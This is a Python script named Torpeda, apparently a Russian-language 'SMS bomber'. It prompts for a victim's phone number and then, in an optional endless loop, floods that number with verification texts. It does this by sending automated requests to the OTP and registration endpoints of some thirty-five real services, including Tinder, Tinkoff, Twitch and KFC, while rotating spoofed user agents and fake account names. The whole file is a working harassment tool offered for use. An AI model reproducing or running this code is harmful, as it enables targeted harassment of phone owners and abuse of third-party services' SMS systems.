#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Name: Torpeda - superfast SMS bomber for Android.
# Author: nordbearbot
# Date: 21/01/22
# Version: 0.0.1.
#
# ████████  ██████  ██████  ██████  ███████ ██████   █████  
#    ██    ██    ██ ██   ██ ██   ██ ██      ██   ██ ██   ██ 
#    ██    ██    ██ ██████  ██████  █████   ██   ██ ███████ 
#    ██    ██    ██ ██   ██ ██      ██      ██   ██ ██   ██ 
#    ██     ██████  ██   ██ ██      ███████ ██████  ██   ██ 
                                                          
                                                                                                          
banner = '''
▄▄▄█████▓ ▒█████   ██▀███   ██▓███  ▓█████ ▓█████▄  ▄▄▄      
▓  ██▒ ▓▒▒██▒  ██▒▓██ ▒ ██▒▓██░  ██▒▓█   ▀ ▒██▀ ██▌▒████▄    
▒ ▓██░ ▒░▒██░  ██▒▓██ ░▄█ ▒▓██░ ██▓▒▒███   ░██   █▌▒██  ▀█▄  
░ ▓██▓ ░ ▒██   ██░▒██▀▀█▄  ▒██▄█▓▒ ▒▒▓█  ▄ ░▓█▄   ▌░██▄▄▄▄██ 
  ▒██▒ ░ ░ ████▓▒░░██▓ ▒██▒▒██▒ ░  ░░▒████▒░▒████▓  ▓█   ▓██▒
  ▒ ░░   ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░▒▓▒░ ░  ░░░ ▒░ ░ ▒▒▓  ▒  ▒▒   ▓▒█░
    ░      ░ ▒ ▒░   ░▒ ░ ▒░░▒ ░      ░ ░  ░ ░ ▒  ▒   ▒   ▒▒ ░
  ░      ░ ░ ░ ▒    ░░   ░ ░░          ░    ░ ░  ░   ░   ▒   
             ░ ░     ░                 ░  ░   ░          ░  ░
                                            ░                
		    Авторы: Enigma & Commit 404 (nordbearbot)  
		    t.me/CrimsonCoalition
        Версия: V.2.0
'''
import sys
try:
    import random, datetime, argparse, os
    from time import sleep
except ImportError:
    print('Критическая ошибка! Убедитесь, что Python 3.x верно установлен.')
    sys.exit(1)
try:
    import requests
except ImportError:
    print('Ошибка! Не удалось импортировать необходимые библиотеки.')
    print('Введите "pip install requests" для исправления ошибки.')
    sys.exit(1)


heads = [
    {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0',
    'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
    {
    'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0',
    'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0",
    'Accept': '*/*'
    },
]

def Logo():
    global phone
    global name
    global iteration
    print(banner)
    iteration = 0
    name = ''
    phone = input('Номер жертвы:  ')
    count = int(input('Количество циклов (0 - бесконечно):  '))
    print('Предупреждение! Некоторые сервисы научились предотвращать их использование в "таких" целях.')
    
    if count == 0:
        while True:
            bombing()
            iteration += 1
            print(iteration, ' круг пройден. ')


    else:
        for i in range(count):
            bombing()
            iteration += 1
            print(iteration, ' круг пройден. ')
        print('Спам окончен')
        input('Нажмите "Enter", чтобы выйти...')




        
def bombing():
    HEADERS = random.choice(heads)
    global phone
    global name
    global iteration
    if phone[0] == '+':
        phone = phone[1:]
    if phone[0] == '8':
        phone = '7' + phone[1:]
    if phone[0] == '9':
        phone = '7' + phone
    for x in range(12):
        name = name + random.choice(list('1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        password = name + random.choice(list('1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = name + random.choice(list('1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

    phone9 = phone[1:]
    phone_plus = '+' + phone
    phone8 = '8' + phone[1:]
    email = name+f'{iteration}'+'@gmail.com'
    email = name+f'{iteration}'+'@gmail.com'
    try:
        requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': phone}, headers=HEADERS)
        print('SunLight: отправлено')
    except:
        print('SunLight: не отправлено')

    try:
        requests.post('https://cloud.mail.ru/api/v2/notify/applink',json = {"phone": phone_plus, "api": 2, "email": "email","x-email": "x-email"}, headers=HEADERS)
        print('iCloud: отправлено')
    except:
        print('iCloud: не отправлено')

    try:
    	requests.post('https://b.utair.ru/api/v1/login/', data = {'login':phone8}, headers=HEADERS)
    	print('Utair: отправлено')
    except:
        print('Utair: не отправлено')

    try:
        requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data = {"phone_number":phone}, headers=HEADERS)
        print('Tinder: отправлено')
    except:
        print('Tinder: не отправлено')

    try:
        requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data = {"st.r.phone": phone_plus}, headers=HEADERS)
        print('Одноклассники: отправлено')
    except:
        print('Одноклассники: не отправлено')

    try:
    	requests.post('https://app.karusel.ru/api/v1/phone/', data = {"phone":phone}, headers=HEADERS)
    	print('Карусель: отправлено')
    except:
        print('Карусель: не отправлено')

    try:
        requests.post('https://youdrive.today/login/web/phone', data = {'phone': phone9, 'phone_code': '7'},headers=HEADERS)
        print('YouDrive: отправлено')
    except:
        print('YouDrive: не отправлено')

    try:
    	requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': phone}, headers=HEADERS)
    	print('MTS TV: отправлено')
    except:
        print('MTS TV: не отправлено')

    try:
    	requests.post('https://youla.ru/web-api/auth/request_code', json = {"phone":phone_plus}, headers=HEADERS)
    	print('Юла: отправлено')
    except:
        print('Юла: не отправлено')

    try:
        requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + phone}, headers=HEADERS)
        print('Яндекс.Еда: не отправлено')
    except:
        print('Яндекс.Еда: не отправлено')

    try:
        requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data= {"phone": phone}, headers=HEADERS)
        print('IVI: отправлено')
    except:
        print('IVI: не отправлено')

    try:
        requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": phone, "SignupForm[device_type]": 3}, headers=HEADERS)
        print('DeliTime: отправлено')
    except:
        print('DeliTime: не отправлено')

    try:
        requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"}, headers=HEADERS)
        print('ICQ: отправлено')
    except:
        print('ICQ: не отправлено')

    try:
        requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
        print('Grabaxi: отправлено')
    except:
        print('GrabTaxi: не отправлено')

    try:
        requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': phone9}).json()['res']
        print('RuTaxi: отправлено')
    except:
        print('RuTaxi: не отправлено')

    try:
        requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': phone_plus}, headers={})
        print('Tinkoff: отправлено')
    except:
        print('Tinkoff: не отправлено')

    try:
        requests.post('https://www.rabota.ru/remind', data={'credential': phone})
        print('Работа: отправлено')
    except:
        print('Работа: не отправлено')

    try:
        requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': phone_plus})
        print('Rutube: отправлено')
    except:
        print('Rutube: не отправлено')

    try:
        requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': name,'phone': phone, 'promo': 'yellowforma'})
        print('Smsint: отправлено')
    except:
        print('Smsint: не отправлено')

    try:
        requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone=' + phone9 + '&country_code=%2B7&nod=4&locale=en')
        print('Oyorooms: отправлено')
    except:
        print('Oyorooms: не отправлено')

    try:
        requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': phone,'g-recaptcha-response': '','recaptcha': 'on'})
        print('Мвидео: отправлено')
    except:
        print('Мвидео: не отправлено')

    try:
        requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
        print('Newnext: отправлено')
    except:
        print('Newnext: не отправлено')

    try:
        requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': phone})
        print('Invitro: отправлено')
    except:
        print('Invitro: не отправлено')

    try:
        requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
        print('Psbank: отправлено')
    except:
        print('PSbank: не отправлено')

    try:
        requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': phone})
        print('Beltelcom: отправлено')
    except:
        print('Beltelcom: не отправлено')

    try:
        requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + phone})
        print('KFC: отправлено')
    except:
        print('KFC: не отправлено')

    try:
        requests.post('https://api.carsmile.com/',json={'operationName': 'enterPhone', 'variables': {'phone': phone},'query': 'mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n'})
        print('Carsmile: отправлено')
    except:
        print('Carsmile: не отправлено')

    try:
        requests.post('https://www.citilink.ru/registration/confirm/phone/+' + phone + '/')
        print('Citilink: отправлено')
    except:
        print('CitiLink: не отправлено')

    try:
        requests.post('https://terra-1.indriverapp.com/api/authorization?locale=ru',data={'mode': 'request', 'phone': '+' + phone,'phone_permission': 'unknown', 'stream_id': 0, 'v': 3, 'appversion': '3.20.6','osversion': 'unknown', 'devicemodel': 'unknown'})
        print('InDriver: отправлено')
    except:
        print('Indriver: не отправлено')

    try:
        requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + self.formattedphone})
        print('Lenta: отправлено')
    except:
        print('Lenta: не отправлено')

    try:
        requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={'phone': '+' + phone, 'api': 2, 'email': 'email','x-email': 'x-email'})
        print('Mail.ru: отправлено')
    except:
        print('Mail.ru: не отправлено')

    try:
        requests.post('https://plink.tech/register/',json={'phone': phone})
        print('Plink: отправлено')
    except:
        print('Plink: не отправлено')

    try:
        requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json = {"phone": phone}, headers=HEADERS)
        print('Qlean: отправлено')
    except:
        print('Qlean: не отправлено')

    try:
        requests.post('https://passport.twitch.tv/register?trusted_request=true',json={'birthday': {'day': 11, 'month': 11, 'year': 1999},'client_id': 'kd1unb4b3q4t58fwlpcbzcbnm76a8fp', 'include_verification_code': True,'password': password, 'phone_number': phone,'username': username})
        print('Twitch: отправлено')
    except:
        print('Twitch: не отправлено')

    try:
        requests.post('https://www.delivery-club.ru/ajax/user_otp', data={'phone': phone})
        print('DeliveryClub: отправлено')
    except:
        print('DeliveryClub: не отправлено')
Logo()
